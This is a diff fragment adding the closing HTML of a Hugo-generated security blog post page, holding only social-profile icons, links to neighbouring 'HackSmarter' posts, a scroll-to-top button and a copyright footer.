+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="https://k40tik.github.io/posts/ascension-hacksmarter/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Ascension — HackSmarter</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-08-07 09:08:04 &#43;0300 EAT">7 August 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="https://k40tik.github.io/posts/past-hacksmarter/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Past — HackSmarter</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-08-10 17:00:00 &#43;0300 EAT">10 August 2026</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
